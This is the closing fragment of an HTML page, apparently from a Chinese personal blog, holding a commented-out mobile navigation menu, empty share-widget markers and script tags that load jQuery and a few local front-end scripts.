    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>